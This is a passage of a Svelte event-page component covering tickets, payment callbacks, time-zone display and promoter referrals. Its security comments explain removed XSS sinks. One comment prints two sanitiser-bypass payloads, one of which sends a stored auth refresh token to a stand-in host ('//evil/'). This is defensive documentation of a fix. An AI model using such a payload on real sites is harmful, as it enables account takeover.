<script lang="ts">
	// C-09 — every user-content {@html} sink routes through one shared
	// sanitizer. A bare {@html} on stored content is a bug.
	import { sanitizeHtml } from '$lib/security/sanitizeHtml';
	import { goto } from '$app/navigation';
	import { page } from '$app/stores';
	import SubscribeModal from '$lib/components/SubscribeModal.svelte';
	// C-14 — plain-text preview helper. Replaces two `{@html}` sinks that fed a
	// regex tag-strip straight back into the HTML parser.
	import { stripTagsForPreview } from '$lib/utils/textPreview';
	import Seo from '$lib/components/Seo.svelte';
	import { publicSubscribeToCollection } from '$lib/services/collection.services';
	import { getEventDays, getPublicEventPage } from '$lib/services/event.services';
	import { authState, isAuthenticated } from '$lib/stores/auth.store';
	import { setEventSlug } from '$lib/stores/eventSlug';
	import { activeEventPageTheme, getEventTheme, setEventTheme } from '$lib/stores/eventTheme';
	import { toast } from '$lib/stores/toast.store';
	import type { Color } from '$lib/utils/colors';
	import { colors } from '$lib/utils/colors';
	import { formatMoney, majorToKobo } from '$lib/utils/money';
	import { clearPaymentCallbackFromUrl, parsePaymentCallback } from '$lib/utils/paymentCallback';
	import { onMount } from 'svelte';
	import RegistrationModal from '../components/modal/RegistrationModal.svelte';
	import OrganiserList from '../components/OrganiserList.svelte';
	import PromoterCard from '../components/PromoterCard.svelte';
	import { formatInZone, formatDateInZone, zoneAbbreviation } from '$lib/utils/eventTime';

	export let data: any = {};
	$: seo = data?.seo;

	$: eventId = $page.params.id ?? '';

	let selectedTicket = '';
	let ticketQuantity: Record<string, number> = {};
	let showAddModal = false;
	let loading = true;
	let error = '';

	// Data from API
	let event: any = null;
	let ticketTypes: any[] = [];
	let organizers: any[] = [];
	let attendeeCount = 0;
	let attendingSample: any[] = [];
	// Public-page display controls. Privacy-first defaults: names hidden.
	let pageSettings = { showAttendeeCount: true, showAttendeeNames: false, showCoOrganizers: true };
	let collectionInfo: any = null;
	let registrationFields: any[] = [];
	let organizerProfile: any = null;
	let paymentSuccess = false;
	let paymentFailed = false;
	let paymentRegId = '';
	let eventDaysData: any[] = [];
	/**
	 * Celebration-layer flags, RESOLVED server-side.
	 *
	 * `guestContributions.enabled` here is already the AND of the legacy
	 * `donationsEnabled` master switch and the config block, and
	 * `giftRegistry.enabled` already accounts for `showOnPublicPage`. Never
	 * re-derive either from `event.*` on this page.
	 */
	let features: import('$lib/services/event.services').PublicEventFeatures | null = null;
	/** Public contributor wall — names + notes only; per-person amounts never leave the server. */
	let contributorWall: { name: string; message: string | null; at: string }[] = [];
	let contributorSummary = { contributorCount: 0, raisedKobo: 0 };

	let themeColor: Color = colors[0];
	$: if (eventId) themeColor = getEventTheme(eventId);

	onMount(async () => {
		if (!eventId) return;

		/**
		 * GAP 9 — capture `?ref=CODE` from a promoter's link.
		 *
		 * sessionStorage, NOT localStorage, and keyed per event. localStorage
		 * would carry a code from one event into a completely unrelated one
		 * weeks later and pay commission on a sale that promoter had nothing to
		 * do with. Session scope also means closing the tab ends the claim,
		 * which is the honest reading of "they came through this link".
		 *
		 * The click beacon is fired here rather than server-side because this
		 * is where a real human actually opened the page.
		 */
		try {
			const ref = new URLSearchParams(window.location.search).get('ref');
			if (ref) {
				const clean = ref.trim().toUpperCase().slice(0, 16);
				sessionStorage.setItem(`rondwell_ref_${eventId}`, clean);
				const { trackPromoterClick } = await import('$lib/services/promoter.services');
				trackPromoterClick(eventId, clean);
			}
		} catch {
			/* a lost referral is a lost stat, never a broken page */
		}

		try {
			const data = await getPublicEventPage(eventId);
			event = data.event;
			ticketTypes = data.ticketTypes;
			organizers = data.organizers;
			attendeeCount = data.attendeeCount;
			attendingSample = data.attendingSample;
			if (data.pageSettings) pageSettings = { ...pageSettings, ...data.pageSettings };
			collectionInfo = data.collection;
			registrationFields = data.registrationFields ?? [];
			organizerProfile = data.organizerProfile ?? null;
			features = data.features ?? null;

			// The contributor wall is decoration on an otherwise-working page —
			// loaded separately and never allowed to break the render.
			if (features?.guestContributions?.enabled && features.guestContributions.showOnPublicPage) {
				import('$lib/services/contribution.services')
					.then(({ getContributorWall }) => getContributorWall('EVENT', eventId))
					.then((wall) => {
						contributorWall = wall.data;
						contributorSummary = wall.summary;
					})
					.catch(() => {});
			}

			// Auto-select first available ticket
			if (ticketTypes.length > 0) {
				const available = ticketTypes.find((t: any) => isTicketAvailable(t));
				selectedTicket = available?._id ?? '';
			}

			// Apply theme from event's themeColor
			if (event.themeColor) {
				const matched = colors.find(
					(c: Color) => c.name.toLowerCase() === event.themeColor.toLowerCase()
						|| c.bg.toLowerCase() === event.themeColor.toLowerCase()
				);
				if (matched) {
					setEventTheme(eventId, matched);
					themeColor = matched;
					activeEventPageTheme.set(matched);
				}
			}

			// Store slug for sub-page URL rewriting
			if (event.customLinkSlug) {
				setEventSlug(eventId, event.customLinkSlug);
			}

			// Fetch event days for multi-day events
			if (event.isMultiDay && event.eventDays?.length > 0) {
				try {
					// Use eventDays from the public page response if available, otherwise fetch
					eventDaysData = data.eventDays ?? await getEventDays(eventId);
				} catch { eventDaysData = []; }
			}
		} catch (e: any) {
			const msg = e.message ?? '';
			if (msg.includes('fetch') || msg.includes('Failed to fetch') || msg.includes('NetworkError') || msg.includes('not running')) {
				error = 'not running';
			} else if (msg.includes('not found') || msg.includes('404')) {
				error = 'not found';
			} else {
				error = msg || 'Something went wrong';
			}
		} finally {
			loading = false;
		}

		// FE-P0-05: parse the gateway-callback URL params through a single
		// helper. The webhook is the canonical settlement path
		// (services/payment/src/services/WebhookService.ts) — webhooks are
		// fully idempotent end-to-end via `WebhookEvent`, so we DO NOT call
		// `verify-and-settle` here. The only thing left to do client-side is
		// finalize the registration (which itself is idempotent). The success
		// banner is purely cosmetic.
		const callback = parsePaymentCallback(window.location.search);
		if (callback.status === 'success' && callback.registrationId) {
			const EVENT_URL = import.meta.env.VITE_EVENT_API_URL;
			try {
				await fetch(`${EVENT_URL}/api/v1/events/${eventId}/registrations/finalize/${callback.registrationId}`, {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
				});
			} catch { /* finalization may already be handled by webhook */ }
			paymentSuccess = true;
			paymentRegId = callback.registrationId;
			clearPaymentCallbackFromUrl();
		} else if (callback.status === 'failed') {
			paymentFailed = true;
			clearPaymentCallbackFromUrl();
		}
	});

	// Helpers

	/**
	 * H-75 — the zone the event happens in, for every formatter below.
	 *
	 * Falls back to the viewer's zone only when the event carries none. That
	 * fallback is honest: with no `event.timeZone` there is nothing else to
	 * render in, and `zoneAbbreviation` will then label it with the viewer's
	 * zone rather than claiming the event's.
	 */
	$: eventZone =
		(event?.timeZone as string) ||
		(() => {
			try {
				return Intl.DateTimeFormat().resolvedOptions().timeZone || 'UTC';
			} catch {
				return 'UTC';
			}
		})();

	/**
	 * H-75 — formatted **in the event's zone**.
	 *
	 * `toLocaleDateString` with no `timeZone` option formats in the *runtime's*
	 * zone. For an evening event that means the date itself can be wrong: a
	 * 9:00 PM Lagos event on the 5th is 4:00 PM New York on the 5th, but a
	 * 1:00 AM Lagos event on the 6th renders as the 5th in New York. **The
	 * attendee reads the wrong day for an event they have paid for.**
	 */
	function formatEventDate(dt: string): string {
		if (!dt) return 'Date TBD';
		return formatDateInZone(dt, eventZone, {
			weekday: 'long',
			month: 'short',
			day: 'numeric'
		});
	}

	/**
	 * H-75 — **the digits and the label now come from the same zone.**
	 *
	 * This formatted with `toLocaleTimeString` and no `timeZone` option — the
	 * viewer's zone — and then appended `tz`, which is `event.timeZone`. So a
	 * 7:00 PM Lagos event viewed from New York rendered **"2:00 PM
	 * Africa/Lagos"**: a real time, a real zone name, and a statement that is
	 * false.
	 *
	 * The label is now a short abbreviation derived from the same instant and
	 * zone used for the digits (`WAT`, `GMT+1`), rather than the raw IANA name.
	 * The IANA name looks authoritative, which is part of why the mismatch was
	 * hard to notice.
	 *
	 * The same-day comparison is made **in the event's zone** too, using the
	 * formatted date strings — comparing `getDate()` on two `Date` objects
	 * compares them in the viewer's zone and can disagree with what is being
	 * displayed.
	 */
	function formatEventTime(start: string, end: string, tz: string): string {
		if (!start) return '';
		const zone = tz || eventZone;

		const s = formatInZone(start, zone, { hour: 'numeric', minute: '2-digit', hour12: true });
		const tzLabel = zone ? ` ${zoneAbbreviation(start, zone)}` : '';

		if (!end) return `${s}${tzLabel}`;

		const e = formatInZone(end, zone, { hour: 'numeric', minute: '2-digit', hour12: true });

		const sameDay =
			formatDateInZone(start, zone, { year: 'numeric', month: '2-digit', day: '2-digit' }) ===
			formatDateInZone(end, zone, { year: 'numeric', month: '2-digit', day: '2-digit' });

		if (sameDay) return `${s} – ${e}${tzLabel}`;

		const endDateStr = formatDateInZone(end, zone, { month: 'short', day: 'numeric' });
		return `${s} – ${endDateStr}, ${e}${tzLabel}`;
	}

	function getMonth(dt: string): string {
		if (!dt) return '';
		return new Date(dt).toLocaleDateString('en-US', { month: 'short' });
	}

	function getDay(dt: string): string {
		if (!dt) return '--';
		return new Date(dt).getDate().toString();
	}

	function getLocationLabel(ev: any): string {
		if (!ev) return 'Location TBD';
		if (ev.eventType === 'VIRTUAL') return ev.locationDetails?.virtual?.platform ?? 'Virtual';
		if (ev.locationDetails?.physical?.venueName) return ev.locationDetails.physical.venueName;
		return 'Location TBD';
	}

	function getLocationAddress(ev: any): string {
		if (!ev?.locationDetails?.physical) return '';
		const p = ev.locationDetails.physical;
		return p.resolvedAddress?.formatted_address ?? p.venueAddress ?? '';
	}

	function getMapEmbedUrl(ev: any): string {
		const addr = getLocationAddress(ev);
		if (!addr) return '';
		return `https://www.google.com/maps?q=${encodeURIComponent(addr)}&output=embed&z=14`;
	}

	function isTicketAvailable(ticket: any): boolean {
		if (!ticket) return false;
		const now = new Date();
		// Block all tickets if event has ended
		if (event?.eventStatus === 'ENDED' || event?.eventStatus === 'CANCELLED') return false;
		if (event?.endDateTime && new Date(event.endDateTime) < now) return false;
		if (ticket.salesEndDate && new Date(ticket.salesEndDate) < now) return false;
		if (ticket.salesStartDate && new Date(ticket.salesStartDate) > now) return false;
		// FE-P3-02 (NEW-1.1, NEW-4.1) — atomic inventory. The backend exposes
		// `soldCount` / `reservedCount` on TicketType. When the cap is hit
		// we hide the ticket from the client to avoid a `SOLD_OUT` 409 round
		// trip.
		const cap = Number(ticket.quantityAvailable ?? 0);
		if (cap > 0) {
			const consumed = Number(ticket.soldCount ?? 0) + Number(ticket.reservedCount ?? 0);
			if (consumed >= cap) return false;
		}
		return true;
	}

	/**
	 * FE-P3-02 — "Only N left" hint. Returns the remaining seats when the
	 * cap is set AND inventory is below 10. Returns `null` when the ticket
	 * is unlimited (cap = 0) or above the threshold.
	 */
	function getTicketRemaining(ticket: any): number | null {
		const cap = Number(ticket?.quantityAvailable ?? 0);
		if (!cap) return null;
		const sold = Number(ticket?.soldCount ?? 0);
		const reserved = Number(ticket?.reservedCount ?? 0);
		const remaining = Math.max(0, cap - sold - reserved);
		return remaining < 10 ? remaining : null;
	}

	function formatTicketPrice(ticket: any): string {
		// FE-P0-01 / FE-P1-16: drive every ticket-price string from
		// `formatMoney(amountKobo, currency)` so USD / GBP / EUR / ETH render
		// with their proper symbol instead of `₦`. Until the backend serves
		// `priceKobo` directly we convert the legacy major-unit `ticket.price`
		// at the boundary exactly once via `majorToKobo`.
		if (ticket.isFree || !ticket.price || ticket.price === 0) return 'Free';
		const currency = ticket.currency ?? 'NGN';
		return formatMoney(majorToKobo(ticket.price, currency), currency, { minimumFractionDigits: 0 });
	}

	function getTicketSalesEndLabel(ticket: any): string {
		if (!ticket.salesEndDate) return '';
		const d = new Date(ticket.salesEndDate);
		if (d < new Date()) {
			return `Sales ended ${d.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' })}, ${d.toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit' })}`;
		}
		return '';
	}

	$: isGroupEnabled = event?.groupRegistrationEnabled === true;
	$: maxGroupSize = event?.maxGroupSize ?? 10;
	$: selectedQuantity = ticketQuantity[selectedTicket] ?? 1;
	$: anyTicketAvailable = ticketTypes.some((t: any) => isTicketAvailable(t));
	$: selectedTicketAvailable = selectedTicket ? isTicketAvailable(ticketTypes.find((t: any) => t._id === selectedTicket)) : false;
	$: isFreeNoTicketEvent = ticketTypes.length === 0 && event?.registrationOpen === true;

	function getRegisterButtonLabel(): string {
		const ticket = ticketTypes.find(t => t._id === selectedTicket);
		if (!ticket) return 'Register';
		const qty = ticketQuantity[selectedTicket] ?? 1;
		if (ticket.requiresApproval) return qty > 1 ? `Request ${qty} Tickets` : 'Request to Get In';
		if (ticket.isFree || !ticket.price) return qty > 1 ? `Register ${qty} Tickets` : 'Register';
		// FE-P0-01: render the total via `formatMoney` so non-NGN currencies
		// don't get a hardcoded `₦` symbol.
		const currency = ticket.currency ?? 'NGN';
		const totalKobo = majorToKobo(ticket.price, currency) * qty;
		const formatted = formatMoney(totalKobo, currency, { minimumFractionDigits: 0 });
		return qty > 1 ? `Register ${qty} Tickets — ${formatted}` : `Register — ${formatted}`;
	}

	$: attendingNames = attendingSample.map(g => [g.firstName, g.lastName].filter(Boolean).join(' ') || 'Guest').join(', ');
	$: remainingCount = Math.max(0, attendeeCount - attendingSample.length);
	// Display gating driven by the organizer's event-page settings.
	$: showAttendeeCount = pageSettings?.showAttendeeCount !== false;
	$: showAttendeeNames = pageSettings?.showAttendeeNames === true && attendingSample.length > 0;
	$: showAttendingSection = showAttendeeCount || showAttendeeNames;

	$: organizerEmail = organizerProfile?.email
		|| (organizers.length > 0 ? organizers[0].email : '')
		|| '';

	// Check if the current logged-in user is the organizer or an admin of this event
	$: isEventOrganizer = $isAuthenticated && $authState.user
		? (event?.organizerId === $authState.user.id || organizers.some((a: any) => a.userId === $authState.user?.id))
		: false;

	let showSubscribeModal = false;
	let eventSubscribing = false;

	async function handleEventSubscribeClick() {
		if (!collectionInfo?._id) return;
		if ($isAuthenticated && $authState.user) {
			eventSubscribing = true;
			try {
				const u = $authState.user;
				const profileName = $authState.activeProfile?.name || '';
				const result = await publicSubscribeToCollection(collectionInfo._id, {
					email: u.email,
					firstName: profileName.split(' ')[0] || '',
					lastName: profileName.split(' ').slice(1).join(' ') || '',
					userId: u.id,
				});
				if (result.alreadySubscribed) {
					toast.info('You are already subscribed to this collection.');
				} else {
					toast.success(`Subscribed to ${collectionInfo.name} successfully!`);
				}
			} catch (e: any) {
				toast.error(e.message || 'Failed to subscribe');
			} finally {
				eventSubscribing = false;
			}
		} else {
			showSubscribeModal = true;
		}
	}
</script>

<!-- SEO Meta Tags (server-rendered) -->
<Seo {seo} />

<!-- Payment Success Banner -->
{#if paymentSuccess}
<div class="mb-4 w-full max-w-6xl rounded-xl p-4 flex items-center gap-3" style="background-color: #dcfce7; border: 1px solid #86efac;">
	<svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M9 12l2 2 4-4" stroke="#16a34a" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/><circle cx="12" cy="12" r="10" stroke="#16a34a" stroke-width="2"/></svg>
	<div>
		<p class="text-sm font-medium text-green-800">Payment successful! Your registration is confirmed.</p>
		<p class="text-xs text-green-600">Check your email for your ticket, QR code, and event passcode.</p>
	</div>
	<button class="ml-auto text-green-600 hover:text-green-800" on:click={() => paymentSuccess = false} aria-label="Dismiss">
		<svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M18 6L6 18M6 6l12 12" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
	</button>
</div>
{/if}

{#if paymentFailed}
<div class="mb-4 w-full max-w-6xl rounded-xl p-4 flex items-center gap-3" style="background-color: #fef2f2; border: 1px solid #fca5a5;">
	<svg width="24" height="24" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#dc2626" stroke-width="2"/><path d="M15 9l-6 6M9 9l6 6" stroke="#dc2626" stroke-width="2" stroke-linecap="round"/></svg>
	<div>
		<p class="text-sm font-medium text-red-800">Payment was not completed. Your registration is pending.</p>
		<p class="text-xs text-red-600">You can try again by selecting a ticket and registering.</p>
	</div>
	<button class="ml-auto text-red-600 hover:text-red-800" on:click={() => paymentFailed = false} aria-label="Dismiss">
		<svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M18 6L6 18M6 6l12 12" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
	</button>
</div>
{/if}

{#if loading}
<!-- Skeleton Loader -->
<div class="w-full max-w-6xl">
	<div class="flex flex-col gap-6 py-4 md:flex-row md:gap-9">
		<!-- Left column skeleton -->
		<div class="w-full md:max-w-[378px]">
			<div class="skeleton-shimmer aspect-square w-full rounded-[27px] md:size-[378px]"></div>
			<div class="skeleton-shimmer mt-3 h-16 rounded-lg" style="animation-delay: 0.1s;"></div>
		</div>
		<!-- Right column skeleton -->
		<div class="flex-1 space-y-5">
			<div class="skeleton-shimmer h-40 rounded-2xl" style="animation-delay: 0.15s;"></div>
			<div class="skeleton-shimmer h-64 rounded-2xl" style="animation-delay: 0.25s;"></div>
			<div class="skeleton-shimmer h-32 rounded-2xl" style="animation-delay: 0.35s;"></div>
		</div>
	</div>
	<!-- Centered loading indicator -->
	<div class="mt-8 flex flex-col items-center gap-4">
		<div class="loading-dots flex items-center gap-2">
			<span class="dot dot-1"></span>
			<span class="dot dot-2"></span>
			<span class="dot dot-3"></span>
		</div>
		<p class="text-sm text-gray-400">Loading event details</p>
	</div>
</div>

{:else if error}
<div class="flex h-[70vh] w-full items-center justify-center px-4">
	<div class="flex max-w-md flex-col items-center text-center gap-5">
		<!-- Illustration -->
		<div class="flex h-24 w-24 items-center justify-center rounded-full bg-gray-100">
			<svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
				<path d="M12 22C17.5 22 22 17.5 22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22Z" stroke="#D1D5DB" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
				<path d="M12 8V13" stroke="#D1D5DB" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
				<path d="M11.9945 16H12.0035" stroke="#D1D5DB" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
			</svg>
		</div>

		<h2 class="text-xl font-semibold text-gray-800">Unable to load this event</h2>

		{#if error.includes('not running') || error.includes('fetch') || error.includes('Failed to fetch') || error.includes('NetworkError')}
			<p class="text-sm leading-relaxed text-gray-500">
				We're having trouble connecting to our servers right now. This is usually temporary — please try again in a moment.
			</p>
		{:else if error.includes('not found') || error.includes('404')}
			<p class="text-sm leading-relaxed text-gray-500">
				This event may have been removed or the link might be incorrect. Double-check the URL or contact the organizer.
			</p>
		{:else}
			<p class="text-sm leading-relaxed text-gray-500">
				Something went wrong while loading this event. Please try again or contact support if the issue persists.
			</p>
		{/if}

		<div class="flex gap-3 mt-2">
			<button
				class="rounded-lg bg-gray-900 px-5 py-2.5 text-sm font-medium text-white transition-colors hover:bg-gray-800"
				on:click={() => window.location.reload()}
			>
				Try Again
			</button>
			<a
				href="/discover"
				class="rounded-lg border border-gray-200 bg-white px-5 py-2.5 text-sm font-medium text-gray-700 transition-colors hover:bg-gray-50 no-underline"
			>
				Browse Events
			</a>
		</div>
	</div>
</div>

{:else if event}
<div class="w-full max-w-6xl">
	<div class="flex flex-col justify-start gap-6 py-4 md:flex-row md:gap-9">

		<!-- Left Column -->
		<div class="w-full md:max-w-[378px]">
			<!-- Event Image -->
			<img
				src={event.displayPictureUrl || event.coverPictureUrl || '/events.png'}
				alt={event.title}
				class="aspect-square w-full rounded-[27px] object-cover md:size-[378px]"
				on:error={(e) => { (e.currentTarget as HTMLImageElement).src = '/events.png'; }}
			/>

			<!-- Organizer Access Card (only if user is the actual organizer/admin of this event) -->
			{#if isEventOrganizer}
			<div
				class="mb-4 mt-3 max-w-[378px] rounded-lg px-3 py-2.5 sm:px-4 sm:py-3"
				style="background-color: {themeColor.cover}; border: 1px solid {themeColor.toggle};"
			>
				<div class="flex items-center justify-between gap-2">
					<div class="max-w-[220px] text-xs leading-6 font-normal sm:text-sm" style="color: {themeColor.lightText};">
						You have organizer <br /> access for this event.
					</div>
					<button
						class="flex items-center justify-center gap-1 rounded-full px-3.5 py-2 text-sm font-medium transition-colors"
						style="background-color: {themeColor.button}; color: {themeColor.buttonText};"
						on:click={() => goto(`/events/${eventId}`)}
					>
						Organize
						<img src="/send-white.svg" alt="icon" class="ml-1 size-4" />
					</button>
				</div>
			</div>
			{/if}

			<!-- Desktop Only Sections -->
			<div class="hidden md:block {isEventOrganizer ? '' : 'mt-4'}">
				<!-- Presented By -->
				{#if collectionInfo}
				<div class="rounded-2xl p-4" style="background-color: {themeColor.cover};">
					<div class="flex items-center justify-between gap-3">
						<div class="flex gap-3">
							<img src={collectionInfo.profilePictureUrl || '/tech-icon.svg'} alt="" class="size-9 rounded-[9px] object-cover" style="background-color: {themeColor.smallCover};" on:error={(e) => { (e.currentTarget as HTMLImageElement).src = '/tech-icon.svg'; }} />
							<div>
								<p class="text-xs" style="color: {themeColor.lightText};">Presented by</p>
								<a href={collectionInfo.slug ? `/c/${collectionInfo.slug}` : `/collection/${collectionInfo._id}/events`} class="flex items-center gap-1 text-sm font-medium no-underline hover:underline" style="color: {themeColor.text};">
									{collectionInfo.name}
									<svg width="8" height="8" viewBox="0 0 8 8" fill="none"><path d="M3 1l3 3-3 3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
								</a>
							</div>
						</div>
						<button
							class="rounded-full px-3.5 py-2 text-sm font-normal transition-colors disabled:opacity-60"
							style="background-color: {themeColor.smallCover}; color: {themeColor.text};"
							disabled={eventSubscribing}
							on:click={handleEventSubscribeClick}
						>
							{eventSubscribing ? '...' : 'Subscribe'}
						</button>
					</div>
					{#if event.description}
					<p class="mt-3 line-clamp-3 text-sm font-light leading-6" style="color: {themeColor.lightText};">
						<!--
							C-14 — `{@html}` REMOVED. This was
							`{@html event.description.replace(/<[^>]*>/g, '').slice(0, 150)}`.

							A regex tag-strip is not a sanitiser, and re-parsing its output
							with `{@html}` defeats whatever it did do. Two one-line bypasses:

							  nested tag        `<<a>img src=x onerror=…>`
							                    the regex eats `<a>`, leaving a live `<img>`

							  unterminated tag  `<img src=x onerror=fetch('//evil/'+localStorage.auth_refresh_token)`
							                    no `>` anywhere, so the regex matches nothing
							                    and the parser auto-closes it on insertion

							This sink is inside the *Presented by* card, so it fires on any
							event belonging to a collection. The `.replace()` read as though
							the value were already sanitised, which is why it survived a
							review that fixed the other sink on this page.

							This only ever wanted plain text — so let Svelte escape it. The
							regex stays as a display nicety (strip markup from the preview),
							not as a security control.
						-->
						{stripTagsForPreview(event.description)}
					</p>
					{/if}
				</div>
				{/if}

				<!-- GAP 9 — promoter CTA. Renders nothing at all when the organizer
				     hasn't enabled promoter mode, so the column is unchanged for
				     every event that doesn't use it. -->
				<PromoterCard
					{eventId}
					eventTitle={event?.title ?? ''}
					eventSlug={event?.customLinkSlug ?? ''}
					{themeColor}
					promoter={features?.promoter ?? null}
				/>

				<!-- Organized By -->
				<div class="mt-6 rounded-[16px] p-4" style="background-color: {themeColor.cover};">
					<h3 class="mb-4 border-b pb-2 text-sm font-normal" style="color: {themeColor.lightText}; border-color: {themeColor.toggle};">
						Organized By
					</h3>
					<div class="space-y-3">
						<!-- Main organizer -->
						<OrganiserList
							organizerName={event.eventOrganizerName ?? 'Organizer'}
							organizerAvatar={organizerProfile?.profilePictureUrl || '/john-avatar.svg'}
							organizerSocial={!!organizerProfile?.socialLinks && Object.values(organizerProfile.socialLinks).some(Boolean)}
							socialLinks={organizerProfile?.socialLinks ?? {}}
							iconColor={themeColor.text}
							iconBgColor={themeColor.cover}
						/>
						<!-- Co-organizers from admins (only those with a name or email) -->
						{#each organizers.filter((a) => a.displayName || a.email) as admin}
							<OrganiserList
								organizerName={admin.displayName ?? admin.email ?? 'Co-organizer'}
								organizerAvatar="/user1-icon.svg"
								organizerSocial={false}
								iconColor={themeColor.text}
								iconBgColor={themeColor.cover}
							/>
						{/each}
					</div>

					<!-- Attending (organizer-controlled: count / names) -->
					{#if showAttendingSection}
					<div class="mt-6">
						<h3 class="mb-4 border-b pb-2 text-sm font-normal" style="color: {themeColor.lightText}; border-color: {themeColor.toggle};">
							{#if showAttendeeCount}{attendeeCount} Attending{:else}Attending{/if}
						</h3>
						{#if showAttendeeCount && attendeeCount === 0}
						<p class="text-sm" style="color: {themeColor.lightText};">Be the first to register</p>
						{:else if showAttendeeNames}
						<div class="space-y-2">
							<p class="max-w-[334px] text-sm" style="color: {themeColor.lightText};">
								{attendingNames}{#if showAttendeeCount && remainingCount > 0} and {remainingCount} others{/if}
							</p>
						</div>
						{/if}
					</div>
					{/if}

					<!-- Footer Links -->
					<div class="mt-6 flex flex-col space-y-2">
						<a href="mailto:{organizerEmail || 'info@rondwell.com'}" class="text-sm font-normal" style="color: {themeColor.lightText};">Contact the Organizer</a>
						<a href="mailto:info@rondwell.com?subject=Report Event: {event.title}" class="text-sm font-normal" style="color: {themeColor.lightText};">Report Event</a>
					</div>
					{#if event.category}
					<div class="mt-4 w-fit rounded-full border px-3 py-1.5 text-sm" style="border-color: {themeColor.toggle}; color: {themeColor.lightText};">
						<span class="mr-1">#</span>{event.category}
					</div>
					{/if}
					{#if event.tags?.length}
					<div class="mt-3 flex flex-wrap gap-2">
						{#each event.tags as tag}
						<div class="w-fit rounded-full border px-2 py-1 text-xs" style="border-color: {themeColor.toggle}; color: {themeColor.lightText};">
							<span class="mr-1">#</span>{tag}
						</div>
						{/each}
					</div>
					{/if}
				</div>
			</div>
		</div>

		<!-- Right Column -->
		<div class="flex-1">
			<!-- Event Title Card -->
			<div class="mb-5 rounded-[16px] p-5" style="background-color: {themeColor.cover};">
				<h2 class="text-3xl font-bold md:text-[48px] md:leading-[56px]" style="color: {themeColor.text};">
					{event.title}
				</h2>

				<!-- GAP 7 — age badge. Themed, never hardcoded colours. -->
				{#if features?.ageRestriction?.enabled}
					<div class="mt-3 flex flex-wrap items-center gap-2">
						<span
							class="inline-flex w-fit items-center gap-1.5 rounded-full px-3 py-1 text-xs font-semibold"
							style="background-color: {themeColor.smallCover}; color: {themeColor.text};"
						>
							🔞 {features.ageRestriction.minimumAge}+ only
						</span>
						{#if features.ageRestriction.verificationMethod === 'ID_REQUIRED'}
							<span
								class="inline-flex w-fit items-center gap-1 rounded-full border px-2.5 py-1 text-xs"
								style="border-color: {themeColor.toggle}; color: {themeColor.lightText};"
							>
								Verified ID required
							</span>
						{/if}
					</div>
				{/if}

				{#if collectionInfo}
				<div class="mt-2 flex items-center md:hidden">
					<div class="mr-2 size-4 rounded-[4px] border flex items-center justify-center text-[8px]" style="border-color: {themeColor.toggle};">🎪</div>
					<a href={collectionInfo.slug ? `/c/${collectionInfo.slug}` : `/collection/${collectionInfo._id}/events`} class="text-xs no-underline hover:underline" style="color: {themeColor.lightText};">{collectionInfo.name}</a>
				</div>
				{/if}

				<!-- Date -->
				<div class="mt-4 flex items-center gap-4">
					<div class="flex h-[49px] w-[44px] flex-col rounded-md border" style="border-color: {themeColor.toggle};">
						<p class="py-[2px] text-center text-xs" style="background-color: {themeColor.smallCover}; color: {themeColor.lightText};">{getMonth(event.startDateTime)}</p>
						<div class="flex flex-1 items-center justify-center border-t" style="border-color: {themeColor.toggle};">
							<p class="text-sm font-medium" style="color: {themeColor.text};">{getDay(event.startDateTime)}</p>
						</div>
					</div>
					<div>
						<div class="text-base font-medium" style="color: {themeColor.text};">{formatEventDate(event.startDateTime)}</div>
						<div class="text-sm" style="color: {themeColor.lightText};">{formatEventTime(event.startDateTime, event.endDateTime, event.timeZone)}</div>
					</div>
				</div>

				<!-- Multi-Day Tabs -->
				{#if event.isMultiDay && event.eventDays?.length > 0}
				<div class="mt-4 flex flex-wrap gap-2">
					{#each event.eventDays as dayId, i}
						{@const dayData = eventDaysData.find((d) => (d._id || d.id) === dayId)}
						{#if dayData}
						<div
							class="flex items-center gap-2 rounded-lg px-3 py-2 text-sm"
							style="background-color: {themeColor.smallCover}; color: {themeColor.text};"
						>
							<div class="flex h-[36px] w-[32px] flex-col rounded border" style="border-color: {themeColor.toggle};">
								<p class="py-[1px] text-center text-[9px]" style="background-color: {themeColor.cover}; color: {themeColor.lightText};">{new Date(dayData.date).toLocaleDateString('en-US', { month: 'short' })}</p>
								<div class="flex flex-1 items-center justify-center">
									<p class="text-xs font-medium">{new Date(dayData.date).getDate()}</p>
								</div>
							</div>
							<div>
								<div class="text-xs font-medium">{dayData.label || `Day ${dayData.dayNumber}`}</div>
								<div class="text-[10px]" style="color: {themeColor.lightText};">
									{new Date(dayData.startTime).toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit' })} – {new Date(dayData.endTime).toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit' })}
								</div>
							</div>
						</div>
						{/if}
					{/each}
				</div>
				{/if}

				<!-- Location -->
				{#if event.eventType === 'VIRTUAL'}
				<div class="mt-3 flex items-center gap-4">
					<div class="flex w-[44px] items-center justify-center rounded-md border py-[11px]" style="border-color: {themeColor.toggle};">
						<svg width="20" height="20" viewBox="0 0 24 24" fill="none" style="color: {themeColor.text};"><path d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
					</div>
					<div class="text-base font-medium" style="color: {themeColor.text};">{event.locationDetails?.virtual?.platform ?? 'Virtual Event'}</div>
				</div>

				{:else if event.eventType === 'HYBRID'}
				<!-- Hybrid: show both virtual and physical -->
